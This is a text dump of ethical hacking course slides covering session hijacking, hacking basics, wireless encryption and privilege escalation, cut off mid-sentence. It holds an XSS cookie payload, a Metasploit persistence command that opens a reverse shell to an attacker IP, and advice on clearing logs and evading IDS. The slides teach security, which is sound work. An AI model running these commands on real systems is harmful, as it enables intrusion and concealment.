{
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-09-Session Hijacking.pptx": "Session Hijacking\nChapter 9\nSystem Hacking-Session Hijacking\u000b\n•\tSession Hijacking Concepts\n•\tApplication-Level Session Hijacking\n•\tNetwork Level Session Hijacking\n•\tSession Hijacking Tools\n•\tCountermeasures\n\nWhat is Session Hijacking?\nSession hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers.\nSince most authentication only occurs at the start of a TCP session, this allows the attacker to gain access to a machine.\nAttackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud, etc.\nThe attacker steals a valid session ID and use it to authenticate himself with the server.\nWhy Session Hijacking is Successful?\nNo account lockout for invalid session IDs.\nWeak session ID generation algorithm or small session IDs.\nInsecure handling of session IDs.\nDNS poisoning, XSS, exploiting a bug in browser\nIndefinite session expiration time.\nMost computers using TCP/IP are vulnerable.\nMost countermeasures do not work unless you use encryption.\nSpoofing vs. Hijacking\nSpoofing Attack:\nAttack pretends to be another user or machine (victim) to gain access.\nAttacker does not take over an existing active session. Instead he initiates a new session using the victim's stolen credentials.\nHijacking:\nSession hijacking is the process of taking over an existing active session.\nAttacker relies on the legitimate user to make a connection and authenticate. \nTypes of Session Hijacking\n\nActive Attack: In an active attack, an attacker finds an active session</span> and takes over.\nPassive Attack: With a passive attack, an attacker hijacks a session but sits back and watches and records all the traffic that is being sent forth.\n\n\nApplication-Level Session Hijacking\nIn a session hijacking attack, a session token is stolen, or valid session token is predicted to gain unauthorized access to the web server.\n\nA session token can be compromised in various ways:\nSession sniffing\nAttacker uses a sniffer(Ex: Wireshark)  to capture a valid session token or session ID and then uses the valid token session to gain unauthorized access to the web server\n2) Predictable session token.\nAttackers perform analysis of variable section of session IDs to determine the existence of a pattern, thus predicting session IDs generated by weak algorithms and impersonate a web site user. The analysis is performed manually or by using various cryptanalytic tools. \n3) Man-in-the-middle attack\nThe man-in-the-middle attack is used to intrude into an existing connection between systems and to intercept messages being exchanged. After the successful interception of TCP connection, an attacker can read, modify, and insert fraudulent data into the intercepted communication.\n4) Man-in-the-browser attack\nMan-in-the-browser attack works with an already installed Trojan Horse which acts between browser and its security mechanisms to intercept the calls between the browser and its security mechanisms or libraries. \n5) Cross-site script attack (Client Side Attack)\nXSS enables attackers to inject malicious client side scripts into the web pages viewed by other users. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker. \nExample:- HttpOnly\n<SCRIPT>alert(document.cookie);</SCRIPT>\n\n\n\n6) Cross-site request forgery attack\nCross-Site Request Forgery (CSRF) attack exploits victim's active session by forcing an end user to execute unwanted actions on a web application in which they’re currently authenticated. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.\n7) Session replay attack\nIn a session replay attack, the attacker listens to the conversation between the user and the server and captures the authentication token of the user.\nOnce the authentication token is captured, the attacker replays the request to the server with the captured authentication token and gains unauthorized access to the server. \n\nNetwork-level Session Hijacking\nThe network-level hijacking relies on hijacking transport and Internet protocols used by web applications in the application layer.\nBy attacking the network-level sessions, the attacker gathers critical information which he can use to attack the application level.\nNetwork-level hijacking includes:\nBlind Hijacking\nUDP Hijacking\nTCP/IP Hijacking\nRST Hijacking\nMan-in-the-Middle: Packet Sniffer\nIP Spoofing: Source Routed Packets\nTCP/IP Hijacking\nTCP/IP hijacking is a hacking technique that uses spoofed packets to take over a connection between a victim and a target machine.\nThe victim's connection hangs, and the attacker is then able to communicate with the host's machine as if the attacker is the victim.\nTo launch a TCP/IP hijacking attack, the attacker must be on the same network as the victim.\nThe target and the victim machines can be anywhere. \nIP Spoofing: Source Routed Packets \nPacket source routing technique is used for gaining unauthorized access to a computer with the help of a trusted host's IP address.\nThe attackers spoofs the host's IP address so that the server managing a session with the host, accepts the packets from the attacker.\nWhen the session is established, the attacker injects forged packets before the host responds to the server.\nThe original packet from the host is lost as the server gets the packet with a sequence number already used by the attacker.\nThe packets are source-routed where the path to the destination IP can be specified by the attacker.\nRST Hijacking\nRST hijacking involves injecting an authentic-looking reset (RST) packet using spoofed source address and predicting the acknowledgment number.\nThe hacker can reset the victim's connection if it uses an accurate acknowledgement number.\nThe victim believes that the source sent the reset packet and resets the connection.\nMiTM Attack Using Forged ICMP and ARP Spoofing \nIn this attack, the packet sniffer is used as an interface between the client and the server.\nARP spoofing involves fooling the host by broadcasting the ARP request and changing its ARP tables by sending the forged ARP replies.\nThe packets between the client and the server are routed through the hijacker's host by using two techniques:\nUsing Forged Internet Control Message Protocol (ICMP): It is an extension of IP to send error messages where the attacker can send messages to fool the client and the server.\nThe technique used is to forge ICMP packets to redirect traffic between the client and the host through the hijacker's host.\nThe hacker's packets send error messages that indicate problems in processing packets through the original connection.\nThis fool the server and client into routing through its path instead.\nUsing Address Resolution Protocol (ARP) Spoofing: ARP is used to map the network layer address (IP address) to link layer addresses (MAC address).\n Session Hijacking Tools\nZaproxy\nThe OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications.\nBurp Suite\nBurp suite allows the attacker to inspect and modify traffic between the browser and the target application.\nIt analyzes all kinds of content, with automatic colorizing of request and response syntax.\nJHijack\nA Java hijacking tool for web application session security assessment.\nA simple Java Fuzzer mainly used for numeric session hijacking and parameter enumeration.\nEtterCap Working\nVideo Link: https://www.youtube.com/watch?v=qgqlrvZDcJw  \n\nLink: https://pentestmag.com/ettercap-tutorial-for-windows/ \nCountermeasures/Detection Methods\nDetection Method\nManual Method\nUsing Packet Sniffing Software\nNormal Telnet Session\nForcing an ARP Entry\nAutomatic Method\nIntrusion Detection Systems (IDS)\nIntrusion Prevention Systems (IPS)\n\nSession Hijacking \nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-1.pptx": "Chapter-1\u000b\u000bIntroduction to Ethical Hacking concepts \nTopics Covered\n\tIntroduction to Ethical Hacking\n     Information Security Overview\n     Security Threats & Attacks overview \n     Ethical Hacking Concepts\n     Consequences of Hacking (legal issues)\n     Teams in ethical hacking \n     Ethical Hacking Phases\n     Differences between Ethical Hacking and Penetration Testing\n     Difference between Ethical Hacking and Vulnerability Testing\n\n\nLab and Activity\u000b\u000bLAB-1: Initial Setup of Ethical Hacking Lab \u000b\u000bActivity: Get Introduced to topics like MITRE, Cyber Kill Chain, APT\u000b\n\n\nWhat are the 3 Principles of Information Security?\nThe three fundamental principles of information security, often referred to as the CIA Triad, are:\nConfidentiality: This principle ensures that information is only accessible to those who have the proper authorization. It involves protecting sensitive data from unauthorized access, disclosure, or exposure. Measures to maintain confidentiality include encryption, access controls, and user authentication.\nIntegrity: Integrity ensures that information remains accurate and trustworthy. It involves safeguarding data from unauthorized alteration, modification, or tampering. Maintaining data integrity is crucial for ensuring that information can be relied upon. Techniques to maintain integrity include checksums, digital signatures, and version control systems.\nAvailability: Availability ensures that information and the systems that store or process it are accessible and operational when needed. It involves protecting against disruptions, downtime, or denial-of-service attacks that could render information unavailable. Redundancy, backup systems, and disaster recovery planning are some strategies used to ensure information availability\n3 Important Terms\nVulnerability: A vulnerability is a weakness or flaw in a computer system, software application, network, or hardware component that can be exploited by an attacker to compromise the system's security. Vulnerabilities can take various forms, including programming errors, misconfigurations, design flaws, or outdated software. They create opportunities for attackers to use exploits and deliver payloads to compromise the targeted system.\n\nExploit: An exploit is a piece of software or a sequence of commands that takes advantage of a specific vulnerability in a computer system or software application to gain unauthorized access, manipulate data, or execute malicious code. Exploits are typically created by malicious actors (hackers) to compromise the security of a system. They can be used to exploit various types of vulnerabilities.\n\nPayload: A payload is a component of an exploit that carries out a specific action or set of actions once the exploit is successfully executed. The payload is often a piece of malicious code or a script that can perform tasks such as providing remote access to an attacker, stealing data, infecting a system with malware, or causing other malicious actions. The payload is what the attacker intends to achieve after exploiting a vulnerability.\n\n\nSecurity Threats Overview- Organizations and individuals face a wide range of security threats and attacks that can compromise the confidentiality, integrity, and availability of data and systems.\nMalware:\nViruses: Malicious software that infects a computer by attaching itself to legitimate programs or files.\nTrojans: Appear as legitimate software but carry out harmful actions once installed.\nWorms: Self-replicating malware that spreads across networks and systems.\nPhishing:\nAttackers impersonate trusted entities to deceive individuals into revealing sensitive information such as passwords and credit card numbers.\n\nRansomware:\nMalware that encrypts a victim's data and demands a ransom for decryption keys.\nDenial of Service (DoS) and Distributed Denial of Service (DDoS):\nOverwhelm a system or network, rendering it unavailable to users by flooding it with excessive traffic.\nData Breaches:\nUnauthorized access or exposure of sensitive data, often leading to identity theft and financial loss.\nInsider Threats:\nMalicious actions or negligence by employees, contractors, or other trusted individuals within an organization.\nZero-Day Vulnerabilities:\nExploits targeting undisclosed and unpatched software vulnerabilities.\nSocial Engineering:\nManipulating people into divulging confidential information through psychological tactics.\nSecurity Attacks Overview- Security attacks are malicious activities or actions taken to exploit vulnerabilities in a system or network.\nMan-in-the-Middle (MitM):\nAttackers intercept and possibly alter communications between two parties without their knowledge.\nBrute Force Attacks:\nRepeatedly trying all possible combinations to crack passwords or encryption keys.\nSQL Injection:\nExploiting vulnerabilities in web applications to manipulate databases.\nCross-Site Scripting (XSS):\nInjecting malicious scripts into web pages viewed by other users.\n\nPrivilege Escalation:\nGaining higher-level access rights than authorized.\nIoT Attacks:\nCompromising Internet of Things (IoT) devices for various malicious purposes.\nAdvanced Persistent Threats (APTs):\nCovert and sophisticated attacks often associated with nation-state actors.\nCryptojacking:\nIllegally using a victim's computer to mine cryptocurrencies.\nEavesdropping:\nUnauthorized interception of private conversations or data\n\n\nWho is a Hacker?\nHacker classes categorize hackers based on their motivations and intentions. There are three primary hacker classes:\nWhite Hat Hackers (Ethical Hackers):\nMotivation: White hat hackers are ethical hackers who use their skills to improve cybersecurity. They are often employed by organizations or work as independent consultants to identify and address security vulnerabilities through authorized and legal means.\n\nIntentions: Their intentions are constructive and aimed at strengthening security by finding and fixing vulnerabilities before malicious hackers can exploit them. They conduct activities such as penetration testing, vulnerability assessments, and security audits.\n\nExamples: Certified Ethical Hackers (CEH) and security professionals focused on protecting systems.\n\n\nBlack Hat Hackers:\nMotivation: Black hat hackers engage in hacking with malicious intent. They aim to exploit vulnerabilities for personal gain, financial profit, or to cause harm to individuals, organizations, or systems.\nIntentions: Their intentions are destructive, and they engage in activities such as stealing sensitive data, launching cyberattacks, distributing malware, and committing cybercrimes.\nExamples: Cybercriminals, identity thieves, and individuals involved in activities like ransomware attacks and data breaches.\n\nGray Hat Hackers:\nMotivation: Gray hat hackers fall between white hat and black hat hackers. They may not have malicious intent, but they often operate in a legally ambiguous or ethically gray area.\nIntentions: Their intentions can vary. Some gray hat hackers may uncover vulnerabilities and notify the affected parties without authorization, while others may demand compensation for disclosing vulnerabilities.\nExamples: Individuals who discover and report vulnerabilities without permission but seek recognition or compensation.\n\nSteps to follow to implement White Hat Hacking\nImplementing white hat hacking, also known as ethical hacking, requires a systematic approach to identify and address security vulnerabilities in a legal and ethical manner. Here are five essential steps to implement white hat hacking\nObtain Authorization\nGather Information\nIdentify and Exploit Vulnerabilities\nReport and Document Findings\nRecommend Mitigation and Remediation\nContinuous Improvement (Optional).\nObtain Authorization:\nIdentify the Target: Determine the scope of your ethical hacking activities, including the systems, networks, or applications you will assess.\nGet Written Permission: Seek explicit written authorization from the target organization or system owner. This ensures that you have legal permission to conduct your testing activities.\n\nGather Information:\nReconnaissance: Collect information about the target, such as IP addresses, domain names, network configurations, and publicly available information about the organization. Tools like DNS lookup, WHOIS, and online research can be helpful.\nDocumentation: Maintain thorough records of all the information gathered and the steps you take throughout the assessment.\n\nIdentify and Exploit Vulnerabilities:\nScanning and Enumeration: Use security scanning tools and techniques to identify vulnerabilities, open ports, and weak configurations. Common tools include Nessus, Nmap, and OpenVAS.\nVulnerability Exploitation: Attempt to exploit identified vulnerabilities within the scope of your authorization. This may include testing for SQL injection, cross-site scripting, and other common attack vectors.\n\nReport and Document Findings:\nPrepare a Detailed Report: Document your findings, including the vulnerabilities discovered, the potential impact of each vulnerability, and recommended remediation steps.\nProvide Evidence: Include evidence of successful exploitation, such as screenshots or logs, to support your findings.\nMaintain Confidentiality: Ensure that sensitive information obtained during the assessment remains confidential and is not disclosed to unauthorized parties.\n\nRecommend Mitigation and Remediation:\nProvide Remediation Advice: Offer guidance on how to fix or mitigate the identified vulnerabilities. These recommendations should be practical and prioritized based on the severity of the issues.\nAssist in Remediation: If the target organization requests it, you can provide assistance in implementing the recommended fixes or verifying that the vulnerabilities have been successfully remediated.\nReiterate Authorization: Ensure that your engagement is concluded properly by obtaining written confirmation from the organization, acknowledging that the testing has ended.\n\nEthical Hacking testing \nEthical hacking, also known as penetration testing, can be performed using various testing methodologies, including \nBlack Box Testing, \nWhite Box Testing, and \nGray Box Testing. \nEach approach has its own advantages and is suited to different scenarios. Here's an overview of these testing methodologies, how to perform them, and when to use them:\nBlack Box Testing:\nIn black box testing, the ethical hacker has no prior knowledge of the internal structure, code, or design of the target system. It simulates how an external attacker would interact with the system.\nWhen to Use:\nBlack box testing is suitable when the tester wants to replicate the perspective of an external attacker who has no insider information.\nIt's often used for web application assessments, network penetration testing, and vulnerability scanning.\n\nWhite Box Testing:\nWhite box testing involves assessing the internal structure, code, and design of the target system. Testers have detailed knowledge of the system's architecture, source code, and configurations.\nWhen to Use:\nWhite box testing is useful when the tester needs to perform a comprehensive analysis of the system's internal logic, such as code review, software security assessment, or analyzing complex systems.\nIt's commonly used for in-depth security assessments, especially for applications with high-security requirements.\n\nGray Box Testing:\nGray box testing combines elements of both black box and white box testing. Testers have partial knowledge of the system's internals but not full access to the source code or detailed design.\nWhen to Use:\nGray box testing strikes a balance between external perspective (black box) and internal knowledge (white box). It's useful when the tester has some information about the target system but not complete access.\nIt can be applied to assess the security of applications where some aspects of the architecture are known, but not all, to simulate a real-world attacker's position.\n\nConsequences of Hacking (legal issues)\nHacking, including unauthorized access to computer systems and networks, is illegal in Oman, as it is in most countries. Engaging in hacking activities can lead to various legal consequences in Oman. Some potential legal issues and consequences related to hacking in Oman:\nPenal Code Violations\nCybercrime Law\nData Protection and Privacy Laws\nElectronic Transactions and Commerce Laws\nInternational Cooperation\nCivil Lawsuit\nExtradition\nPenalties\n\n\nTeams in Ethical Hacking\nRed Teams simulate attackers to uncover vulnerabilities, \nBlue Teams defend against threats and respond to incidents, \nPurple Teams facilitate collaboration between the two to enhance an organization's overall security posture. \nThese teams complement each other to create a robust cybersecurity ecosystem.\nRED Team\nThe Red Team simulates malicious attackers. Their primary goal is to identify vulnerabilities and weaknesses in an organization's systems, networks, and applications by attempting to exploit them. Red Teams use various techniques, including penetration testing, social engineering, and other attack methods.\nAdvantages:\nRealistic assessment: Red Teams provide a realistic perspective on an organization's security posture by emulating actual threats.\nComprehensive testing: They explore a wide range of attack vectors, helping to uncover hidden vulnerabilities.\nValuable insights: Red Team assessments yield valuable insights into how well an organization's security controls and incident response procedures work under pressure.\nDisadvantages:\nCostly and time-consuming: Running a Red Team engagement can be expensive and time-consuming due to the thoroughness of the assessment.\nLimited scope: Red Teams may not evaluate all aspects of an organization's security, focusing primarily on external threats.\nPractical Use: Red Team assessments are typically conducted periodically (quarterly, bi-annually, or annually) to assess an organization's security readiness. The results help organizations identify and prioritize security improvements.\nBLUE Team\nThe Blue Team represents the organization's defenders. They are responsible for maintaining and improving the security posture. Blue Teams monitor network traffic, analyze logs, and respond to security incidents. They aim to detect and mitigate threats before they impact the organization.\nAdvantages:\nContinuous defense: Blue Teams work proactively to protect systems and data on an ongoing basis.\nIncident response: They are skilled in identifying and responding to security incidents promptly.\nReal-time monitoring: Blue Teams use tools like SIEM (Security Information and Event Management) to monitor network traffic and detect anomalies.\nDisadvantages:\nLimited perspective: Blue Teams may not always have the same knowledge or perspective as actual attackers (Red Team).\nResource-intensive: Maintaining a Blue Team with the necessary skills and tools can be resource-intensive.\nPractical Use: Blue Teams are an integral part of an organization's security operations and are active 24/7 to defend against threats. They collaborate closely with Red Teams to learn from assessments and improve defenses.\n\nPURPLE Team\nThe Purple Team bridges the gap between Red and Blue Teams. They facilitate collaboration and knowledge sharing between the two teams. Purple Teams coordinate Red Team engagements and help the Blue Team learn from the findings.\nAdvantages:\nKnowledge transfer: Purple Teams facilitate the transfer of knowledge and expertise between Red and Blue Teams.\nContinuous improvement: They ensure that the organization's security posture improves iteratively by applying lessons learned from Red Team assessments.\nDisadvantages:\nAdditional coordination: Maintaining a Purple Team requires additional coordination efforts and resources.\nMay not identify all issues: Purple Teams may not discover all vulnerabilities themselves but rely on the findings from Red Teams.\nPractical Use: Purple Teams are essential for ensuring that security assessments lead to tangible improvements. They play a pivotal role in making sure that vulnerabilities identified by Red Teams are effectively addressed by Blue Teams.\n\nImportant Terms in ethical hacking \nPenetration Testing: Penetration testing, often referred to as pentesting, is the practice of simulating cyberattacks on a system or network to identify vulnerabilities and weaknesses before malicious hackers can exploit them.\n\nFirewall: A firewall is a network security device or software that monitors and controls incoming and outgoing network traffic based on predetermined security rules. Ethical hackers often test firewalls to identify weaknesses.\n\nPhishing: Phishing is a social engineering technique in which attackers use fake emails, websites, or messages to trick individuals into revealing sensitive information, such as login credentials or personal data.\n\nZero-Day Vulnerability: A zero-day vulnerability is a security flaw in a software application or system that is not yet known to the vendor or the public. Ethical hackers sometimes discover and report such vulnerabilities to help protect systems before they can be exploited.\n\nIncident Response: Incident response is a process that organizations follow when they detect or suspect a security breach. Ethical hackers may be involved in helping organizations develop and improve their incident response plans.\n\n\n\n5 Phases of Ethical Hacking\nReconnaissance (Information Gathering):\nThe initial phase involves gathering information about the target system or network. This includes identifying potential entry points, understanding the organization's infrastructure, and collecting publicly available information.\nActivities: Ethical hackers use various techniques such as DNS enumeration, WHOIS lookup, scanning for open ports, and social engineering (where legal) to collect information.\n\nScanning and Enumeration:\nIn this phase, the ethical hacker scans the target system or network to identify potential vulnerabilities. Enumeration involves actively probing the system to gather additional information.\nActivities: Tools like Nmap, Nessus, and other vulnerability scanners are used to discover open ports, services running on those ports, and potential weaknesses.\n\nVulnerability Analysis:\nAfter identifying open ports and services, the ethical hacker analyzes the discovered vulnerabilities to determine their potential impact and exploitability.\nActivities: The hacker assesses the weaknesses, assigns risk levels, and prioritizes them based on their criticality.\n\nGaining Access(Exploitation):\nIn this phase, ethical hackers attempt to exploit identified vulnerabilities to gain unauthorized access or control over the system.\nActivities: They use appropriate techniques or tools to exploit vulnerabilities, such as attempting to execute code, escalate privileges, or access sensitive data.\n\nMaintaining Access(Post-Exploitation)\nAfter gaining access, the ethical hacker aims to maintain access and gather additional information.\nActivities: They may install backdoors, capture credentials, and explore the compromised system to understand its architecture and data.\n\nClearing Tracks\n“Clearing tracks\" refers to the process of covering your digital footprints and erasing any evidence of your presence or activities on a target system or network after conducting ethical hacking activities. \nThis step is crucial to maintain the legality and ethics of your engagement and to ensure that you leave no trace of your actions. \nNext Slide - the general steps for clearing tracks in the phases of ethical hacking:\nAfter gathering information about the target, clear any logs or artifacts that may have been generated during this initial phase.\nRemove any temporary files or scripts you used to collect information.\nClear any logs or traces on your own system used for scanning activities - Use proxies or VPNs to mask your IP address and location while conducting scans.\nClear any logs or temporary files generated during vulnerability analysis.\nDuring Exploitation - Use techniques that leave minimal traces, and avoid activities that may trigger intrusion detection systems (IDS) or alert administrators.\nAfter successfully exploiting a vulnerability, remove any backdoors or malicious code you may have installed.\n\nReporting, Verification and Testing\nAdditionally, White Hat hacker’s findings from the ethical hacking activities are documented in a comprehensive report and submitted to Management for further actionlike verification and testing.\n\nThe report should include details about vulnerabilities, their potential impact, evidence of successful exploitation, and recommendations for remediation.\nRecommendations may include patching systems, reconfiguring security settings, and improving security policies and procedures.\nAfter the organization implements remediation measures, the ethical hacker retests the system to verify that the vulnerabilities have been successfully addressed.\nThe hacker confirms that the vulnerabilities are no longer exploitable and that the system's security has improved.\n\nDifferences between Ethical Hacking and Penetration Testing\u000b\nScope and Approach:\nEthical Hacking: Ethical hacking is a broader and more comprehensive approach that encompasses a wide range of activities aimed at identifying and mitigating security vulnerabilities. It includes not only penetration testing but also activities like vulnerability assessments, code reviews, and security audits.\nPenetration Testing: Penetration testing is a specific subset of ethical hacking. It focuses primarily on simulating cyberattacks to identify and exploit vulnerabilities in a target system or network.\nGoals and Objectives:\nEthical Hacking: The primary goal of ethical hacking is to proactively assess and enhance overall cybersecurity posture. Ethical hackers aim to identify vulnerabilities and weaknesses in a holistic manner and provide recommendations for improvement.\nPenetration Testing: Penetration testing is more narrowly focused on identifying and exploiting vulnerabilities to assess the security of a specific system or network. Its main objective is to find weaknesses that could be exploited by malicious hackers.\nMethodology and Duration:\nEthical Hacking: Ethical hacking engagements are often long-term and involve various activities conducted over an extended period. These activities may include continuous monitoring, security assessments, and proactive security measures.\nPenetration Testing: Penetration tests are typically short-term engagements with a well-defined scope and duration. They are designed to simulate specific attack scenarios and assess the immediate security of a target system or network.\nDifference between Ethical Hacking and Vulnerability Testing\nScope and Purpose:\nEthical Hacking: Ethical hacking is a comprehensive approach that involves actively attempting to identify and exploit security vulnerabilities, as well as assess overall security posture. It aims to mimic real-world cyberattacks.\nVulnerability Testing: Vulnerability testing is a narrower and more passive process that focuses on identifying vulnerabilities within a system or network without exploiting them. Its primary goal is to list and prioritize vulnerabilities.\nMethodology:\nEthical Hacking: Ethical hackers use various techniques, including penetration testing, code reviews, social engineering, and more, to actively assess and exploit vulnerabilities. They aim to go beyond identifying weaknesses to understand their impact and potential for exploitation.\nVulnerability Testing: Vulnerability testing relies on automated scanning tools and processes to discover vulnerabilities. It typically does not involve actively attempting to exploit or gain unauthorized access to systems.\nDepth of Assessment:\nEthical Hacking: Ethical hacking provides a deeper and more thorough assessment of security by actively exploring vulnerabilities and their potential consequences. It goes beyond mere identification to understand the extent of the risk.\nVulnerability Testing: Vulnerability testing focuses primarily on the identification of vulnerabilities without delving into their exploitation or impact assessment. \nIt provides a snapshot of potential weaknesses. \n\nActivity:\nGet Introduced to topics like MITRE, Cyber Kill Chain, APT\u000b                        -20 Min\n\nCertification Courses In Ethical Hacking\n\n45\nTHANK YOU\nAny Questions!\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-10-Wireless Network Hacking.pptx": "Chapter 11 \nSystem Hacking - Hacking \nWireless Networks\nWireless Concepts\nWireless networks are computer networks that are not connected by cables of any \nkind.\n▰ The basis of wireless systems are radio waves.\n▰ A wireless network is a computer network that uses wireless data connections \nbetween network nodes.\n▰ Examples of wireless networks include cell phone networks, wireless local area \nnetworks (WLANs), wireless sensor networks, satellite communication networks, \nand terrestrial microwave networks\n▰ Homes, telecommunications networks and business installations avoid the costly \nprocess of introducing cables into a building.\n▰ This implementation takes place at the physical level (layer) of the OSI model \nnetwork structure\nWireless Encryption\n▰ WEP:\n▻ WEP is an encryption algorithm for IEEE 802.11 wireless networks.\n\n▻ It is an old and original wireless security standard which can be cracked easily.\n\n▰ WPA: \n▻ It is an advanced wireless encryption protocol using TKIP, MIC, and AES\nencryption.\n\n▻ Uses a 48-bit IV, 32-bit CRC and TKIP encryption for wireless security.\n\n▰ WPA2: \n▻ WPA2 uses AES (128 bit) and CCMP for encryption.\n\nThere are other wireless encryption types such as EAP, WPA2 Enterprise, TKIP, CCMP, AES, 802.11i, RADIUS and LEAP\nWEP Encryption\n▻ What is WEP:\n▻ Wired Equivalent Privacy (WEP) is an IEEE 802.11 wireless protocol which provides security algorithms for data confidentiality during \nwireless transmissions.\n▻ WEP uses a 24-bit initialization vector (IV) to form stream cipher RC4 for confidentiality, and the CRC-32 checksum for integrity of wireless transmission\n▰ WEP encryption can be easily cracked:\n▻ 64-bit WEP uses a 40-bit key\n▻ 128-bit WEP uses a 104-bit key\n▻ 256-bit WEP uses a 232-bit key\n▰ It was developed without:\n▻ Academic or public review\n▻ Review from cryptologists\n▰ WEP Flaws:\n▻ It has significant vulnerabilities and design flaws\n▰ WPA\n▰ Wi-Fi Protected Access (WPA) is a data encryption method for WLANs based on 802.11 standards.\n▰ It is a snapshot of 802.11i (under development) providing stronger encryption and enabling PSK or EAP authentication.\n▰ TKIP (Temporal Key Integrity Protocol):\n▻ TKIP utilizes the RC4 stream cipher encryption with 128-bit keys and 64-bit MIC integrity check.\n▻ TKIP mitigated vulnerability by increasing the size of the IV and using mixing functions\n▰ 128-bit Temporal Key:\n▻ Under TKIP, the client starts with a 128-bit \"temporal key\" (TK) that is then combined with the client's MAC address and with an IV to create a keystream that is used to encrypt data via the RC4.\n▻ It implements a sequence counter to protect against replay attacks.\n▰ WPA Enhances WEP:\n▻ TKIP enhances WEP by adding a rekeying mechanism to provide fresh encryption and integrity keys.\n▻ Temporal keys are changed for every 10,000 packets. This makes TKIP more resistant to cryptanalytic attacks involving key reuse\n▰ WPA2 replaced WPA. WPA2, implements the mandatory elements of IEEE 802.11i. In  particular, it includes mandatory support for CCMP, an AES-based encryption mode. WPA2 certification is mandatory for all new devices to bear the Wi-Fi  trademark.\n▰ In order to enhance the security, WPA2 was invented with strong encryption model \n(AES) and a very strong authentication model based on 802.1x (or PSK). \n▰ WPA was introduced just as a staging mechanism for smooth transition to WPA2. \nA lot of wireless cards did not support the new AES (at that time), but all of them \nwere using RC4 + TKIP. Therefore, WPA was also based on that mechanism, just \nwith a few advancements\nWireless Threats\nAccess Control Attacks \nIntegrity Attacks\nConfidentiality Attacks\nAvailability Attacks\nAuthentication Attacks\nRogue Access Point Attacks\nClient Misassociation\nMisconfigured Access Point Attack\nWireless Hacking Methodology \n1. Wi-Fi Discovery\n2. GPS Mapping\n3. Launch Wireless Attacks\nSetting up your Lab\n▰ Monitor Mode\n▻ Monitor mode, or RFMON (Radio Frequency Monitor) mode, allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel. \n▻ Unlike promiscuous mode, which is also used for packet sniffing, monitor mode allows packets to be captured without having to associate with an access point or ad hoc network first. \n▻ Monitor mode only applies to wireless networks, while promiscuous mode can be used on both wired and wireless networks. \n▻ Not all wireless cards support RFMON mode.\n▰ Limitations of Monitor Mode\n▻ Usually the wireless adapter is unable to transmit in monitor mode and is restricted to a single wireless channel, though this is dependent on the wireless adapter's driver, its firmware, and features of its chipset. \n▻ Also, in monitor mode the adapter does not check to see if the cyclic redundancy check (CRC) values are correct for packets captured, so some captured packets may be corrupted.\n▰ Wireless Adapters Supporting RFMON\n▻ Alfa AWUS036H\n▻ Alfa AWUS036NEH\n▻ Alfa AWUS036NH\n▻ Alfa AWUS036NHA\n▻ Alfa AWUS051NH\n▻ TP-Link TL-WN722N\n▰ Single Band (2.4 GHz) Wireless Adapters\n▻ Alfa AWUS036NHA\n▻ Alfa AWUS036NH\n▻ TP-LINK TL-WN822N\n▻ D-Link DWA-140\n▻ ASUS USB-N14 \n▻ Panda PAU06 USB \n▻ Panda PAU05 USB \n▻ Tenda W311M\nCountermeasures\nDetect and Block Rouge AP\n2. How to Defend Against Wireless Attacks?\nEND\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Ethical Hacking\\Presentation\\Approved_PPT\\Chapter-11-Privilege Escalation.pptx": "Chapter-11 \u000bPrivilege Escalation,\u000bMaintaining Access,\u000bClear Logs\nTopics\nPrivilege Escalation\nTypes of Privilege Escalation\nMethods and tools of privilege escalation\nMaintaining Access\nTools for remote code execution\nSpyware and steganography\nClearing tracks concepts\nCountermeasures\nPrivilege Escalation\nExploiting a bug, design flaw or configuration oversight in an operating system or software application\nTypically performed after you successfully compromise a host with standard/low- level credentials\nYou want to elevate your attacker session to root/administrator, or preferably SYSTEM\nEscalation is usually performed as a local exploit on the compromised host\n\nTypes of privilege escalation\nThere are two types of privilege escalation:\nVertical\nA Lower-level user or process executes code at a higher privilege level\nExample: A standard user account gains administrator/root privilege\nHorizontal\nExecute code at the same privilege level\nBut from a location that would normally be protected from access\n\nVertical privilege escalation\nIn Vertical Privileges Escalation, an attacker attempts to escalate privileges to a higher level. \nVertical privileges escalation occurs when an attacker is attempting to gain access usually to the administrator account from a lower privileged account. \nHigher privileges allow the attacker to access sensitive information, install, modify and delete files and programs such as a virus, Trojans, etc.\n\nHorizontal privilege escalation\nIn Horizontal Privileges Escalation, an attacker attempts to take command over the privileges of another user having the same set of privileges for his account. \nHorizontal privileges escalation occurs when an attacker is attempting to gain access to the same set of resources allowed for the particular user.\nConsider an operating system having multiple users including Administrator having full privileges and User A, User B and so on having limited privileges to run application only. Each user’s are assigned with the same level of privileges. \nBy finding any weakness or exploiting any vulnerability, User A, gain access to User B. Now user A is able to control and access the User B account.\n\nMethods and tools of privilege escalation\u000b\n\n\n\nTools\nGitHub list 248 privilege escalation repos\nMetasploit post modules\nPowerSploit\nDameware Remote Support\nManageEngine Desktop Central\nSearchsploit DB\nPDQ Deploy\nPSExec\nTheFatRat\nMaintaining Access-Persistence\nGetting an initial foothold inside a network during a red team operation is a time-consuming task\nPersistence is key to a successful red team operation\nThere are a number of ways to achieve persistence:\nRATS\nScheduled tasks\nAdd/modify registry keys\nKerberos Golden Ticket or other backdoor account\nTools to add persistence:\nMetasploit\nEmpire (GitHub)\nPowerShell Post-Exploitation Tool\nSharPersist (GitHub)\n\nPersistence using Metasploit Tool\nYou can run a Metasploit script:\n\nrun persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r <attacker IP>\n\nOr you can use the Metasploit post module persistence_exe:\nUse post/windows/manage/persistence_exe\n\nRemote code execution-using Remote Access trojan and Backdoor\nA Remote Access Trojan (RAT) is a malware program that includes a back door for administrative control over the target 